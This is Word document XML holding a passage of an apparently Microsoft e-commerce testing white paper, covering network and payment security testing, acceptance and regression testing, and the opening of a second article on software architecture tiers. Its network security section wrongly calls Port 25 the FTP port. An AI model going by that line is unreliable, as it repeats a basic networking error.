        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Integrity control</w:t>
      </w:r>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t>Network security</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Unauthorized users can wreak havoc on a Web site by accessing confidential information or by damaging the data on the server. This kind of security lapse is due to insufficient network security measures. The network operating system, together with the firewall, takes care of the security over the network.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>The network operating system must be configured to allow only authentic users to access the network. Also, firewalls must be installed and configured. This ensures that the transfer of data is restricted from only one point on the network. This effectively prevents hackers from accessing the network.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>For example, a hacker accesses the unsecured FTP port (Port 25) of a Web server. Using this port as an entry point to the network, the hacker can access data on the server. The hacker may also be able to access any machine connected to this server. Therefore, security testing will indicate these vulnerable areas and will also help to configure the network settings for better security.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Network security over the Internet is tested using programs. One such program for Microsoft Windows 2000 is the Kane Security Analyst (KSA) from Intrusion Detection Inc. KSA is a complete network-testing tool that also tests operating systems other than Windows 2000.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>The KSA network security testing tool tests for:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="196"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>User rights</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="196"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Removable disk locations</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="196"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Strength of password policies</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="196"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Use of logon scripts and password expiration dates</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="196"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Storage of passwords in clear text or encrypted form</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>The KSA report manager generates several reports to check miscellaneous sets of security-related concerns. The software points out security loopholes only and does not trap unauthorized visitors.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Visit these links for more details:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="00B84F48" w:rsidP="004C44FA">
      <w:hyperlink r:id="rId252" w:history="1">
        <w:r w:rsidR="004C44FA">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="00709F"/>
          </w:rPr>
          <w:t>www.intrusion.com</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="004C44FA">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:hyperlink r:id="rId253" w:history="1">
        <w:r w:rsidR="004C44FA">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="00709F"/>
          </w:rPr>
          <w:t>www.rsa.com</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:spacing w:before="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Semibold" w:hAnsi="Segoe UI Semibold"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Semibold" w:hAnsi="Segoe UI Semibold"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Payment transaction security</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Secure transactions create customer confidence. That’s because when customers purchase goods over the Internet, they can be apprehensive about giving credit card information. Therefore, security measures should be communicated to the customer.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Two things needed to be tested to ensure that the customer’s credit card information is safe. First, testing should ensure that the credit card information is transmitted and stored securely. Second, testing should verify that strong encryption software is used to store the credit card information, and only limited, authorized access is allowed to this information.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>For more information on secure electronic transactions, see:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="00B84F48" w:rsidP="004C44FA">
      <w:hyperlink r:id="rId254" w:history="1">
        <w:r w:rsidR="004C44FA">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="00709F"/>
          </w:rPr>
          <w:t>www.verisign.com</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="004C44FA">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:hyperlink r:id="rId255" w:history="1">
        <w:r w:rsidR="004C44FA">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="00709F"/>
          </w:rPr>
          <w:t>www.cylink.com</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="004C44FA">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:hyperlink r:id="rId256" w:history="1">
        <w:r w:rsidR="004C44FA">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="00709F"/>
          </w:rPr>
          <w:t>www.terisa.com</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="004C44FA">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:hyperlink r:id="rId257" w:history="1">
        <w:r w:rsidR="004C44FA">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="00709F"/>
          </w:rPr>
          <w:t>www.cybercash.com</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="004C44FA">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:hyperlink r:id="rId258" w:history="1">
        <w:r w:rsidR="004C44FA">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="00709F"/>
          </w:rPr>
          <w:t>www.checkfree.com</w:t>
        </w:r>
      </w:hyperlink>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Acceptance Testing</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Acceptance testing is performed on a collection of business functions in a production environment, and after the completion of Functional testing. This is the final stage in the testing process before the system is accepted for operational use. It involves testing the system with data supplied by the customer or the site visitor rather than the simulated data developed as part of the testing process.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Acceptance testing often reveals errors and omissions in the system requirements definition. The requirements may not reflect the actual facilities and performance required by the user. Acceptance testing may demonstrate that the system does not exhibit the anticipated performance and functionality. This test confirms that the system is ready for production.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Running a pilot for a select set of customers helps in Acceptance testing for an e-commerce site. A survey is conducted among these site visitors on different aspects of the Web site, such as user friendliness, convenience, visual appeal, relevance, and responsiveness.</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Regression Testing</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Regression testing refers to retesting previously tested components/functionality of the system to ensure that they function properly even after a change has been made to parts of the system.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>As defects are discovered in a component, modifications should be made to correct them. This may require other components in the testing process to be retested.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Component system errors can present themselves later in the testing process. The process is iterative because information is fed back from later stages to earlier parts of the process. Repairing program defects may introduce new defects. Therefore, the testing process should be repeated after the system is modified.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Here are some guidelines to follow for Regression testing:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="197"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Test any modifications to the system to ensure that no new problems are introduced and that the operational performance is not degraded due to the modifications.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="197"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Any changes to the system after the completion of any phase of testing or after the final testing of the system must be subjected to a thorough Regression test. This is to ensure that the effects of the changes are transparent to other areas of the system and other systems that interface with the system.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="197"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>The project team must create test data based on predefined specifications. The original test data should come from other levels of testing and then it should be modified along with test cases.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="312" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Semibold" w:hAnsi="Segoe UI Semibold"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="42"/>
          <w:szCs w:val="42"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1291" w:name="testproc_conc"/>
      <w:bookmarkEnd w:id="1291"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Semibold" w:hAnsi="Segoe UI Semibold"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="42"/>
          <w:szCs w:val="42"/>
        </w:rPr>
        <w:t>Conclusion</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Testing is an essential activity for e-commerce implementation. It ensures software reliability and system assurance. Each element involved in an e-commerce system goes through rigorous testing. This testing ensures a reliable e-commerce site that creates customer confidence.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>The different types of testing are content testing, software and database testing, server load, user acceptance testing, and security testing. E-commerce testing is typically a process of iteration. After the developer fixes errors and bugs in the e-commerce system, the tester has to retest the system for any anomalous behavior due to these fixes.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>The most crucial aspect of e-commerce testing is the test environment. E-commerce testing is challenging. Breaking up the testing tasks based on each of the tiers of the Windows DNA architecture helps to reduce the complexity of the testing task.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:spacing w:before="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Semibold" w:hAnsi="Segoe UI Semibold"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Semibold" w:hAnsi="Segoe UI Semibold"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>Acknowledgment</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Dyson, Peter.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Mastering Microsoft® Internet Information Server</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>4, Second Edition</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Sybex</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>, 1997.</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Note   </w:t>
      </w:r>
      <w:r>
        <w:t>This technical article is one in a series about applying Microsoft Enterprise Services frameworks to e-commerce solutions. </w:t>
      </w:r>
      <w:hyperlink r:id="rId259" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="00709F"/>
          </w:rPr>
          <w:t>E-Commerce White Paper Series</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t> contains a complete list, including descriptions, of all the articles in this series.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00245D89" w:rsidRDefault="00245D89" w:rsidP="004C44FA"/>
    <w:p w:rsidR="00245D89" w:rsidRDefault="00245D89" w:rsidP="004C44FA"/>
    <w:p w:rsidR="00245D89" w:rsidRDefault="00245D89" w:rsidP="00245D89">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:spacing w:before="0" w:after="240"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="222222"/>
          <w:sz w:val="54"/>
          <w:szCs w:val="54"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="222222"/>
          <w:sz w:val="54"/>
          <w:szCs w:val="54"/>
        </w:rPr>
        <w:t>Software Architecture: One-Tier, Two-Tier, Three Tier, N Tier</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00245D89" w:rsidRDefault="00245D89" w:rsidP="00245D89">
      <w:pPr>
        <w:pStyle w:val="entry-meta"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="450" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1292" w:author="Unknown"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1293" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:t>Last Updated on August 21, 2017 by </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="entry-author"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="entry-author"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "https://www.softwaretestingmaterial.com/author/smrajkumar27gmail-com/" </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="entry-author"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="entry-author-name"/>
            <w:color w:val="222222"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:t>Rajkumar</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="entry-author"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:t> </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="entry-comments-link"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="entry-comments-link"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "https://www.softwaretestingmaterial.com/software-architecture/" \l "comments" </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="entry-comments-link"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
          </w:rPr>
